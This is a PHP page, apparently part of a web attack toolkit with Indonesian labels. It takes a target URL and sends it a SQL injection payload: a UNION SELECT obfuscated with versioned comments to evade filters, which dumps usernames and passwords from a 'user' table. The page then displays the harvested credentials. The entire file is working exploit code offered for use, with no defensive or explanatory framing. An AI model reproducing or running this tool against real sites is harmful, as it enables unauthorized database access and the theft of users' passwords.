<?php
$url = isset($_POST['url']) ? htmlspecialchars(addslashes($_POST['url'])) : '';
if(!empty($url)){
   	$ch    = curl_init();
   	$query = "(select+group_concat('<result>',username,0x3a,password,'</result>')+from+user)";
// Set option curl
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "queryString=exploit'/**//*!12345uNIoN*//**//*!12345sELEcT*//**/$query,version()-- -");
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		$exec = curl_exec($ch);
		$preg = preg_match_all("'<result>(.*?)</result>'si", $exec, $isi);
   }
?>

<main class="app-content">
	<div class="app-title">
		<div>
          <h1><?= $jenis; ?></h1>
        </div>
        <ul class="app-breadcrumb breadcrumb">
          <a href="<?= base_url() ?>">
          	<li class="breadcrumb-item"><i class="fa fa-home fa-lg"></i></a></li>
          <li class="breadcrumb-item"><?= $title; ?></li>
        </ul>
      </div>
	</div>
	
			<div class="tile">
				<div class="row">
					<div class="col-md-6">
						<form method="post">
					<input type="url" class="form-control mb-3" required="required" autocomplete="off" placeholder="Url Target" name="url">
					</div>
					<div class="col-md-6">
						<button class="btn btn-danger btn-block" name="start">Start inject</button>
					</div>
				</div>
			</div>
	
		
<?php
if(isset($_POST["start"])){
	if(!empty($isi[1])){
		echo '<div class="tile">
            <h5 class="text-center">Berhasil mendapatkan data</h5><hr>';
             	$i = 1;
             	foreach($isi[1] as $key){
             		$result = "<li><i class='fa fa-user-circle'></i> Username : ".str_replace(":", "</li><li><i class='fa fa-key'></i> Password : ", $key)."</li>";
             		if($i != 1) echo "<hr>";
             		echo "<i class='fa fa-pie-chart'></i> Data ".$i++;
             		echo "<br>$result";
             	}
            //echo '</ul>';
	}else{
		echo '<script>
swal("Gagal mengambil data", "", "error")
</script>';
	}
}
?>
		</div>
	
</main>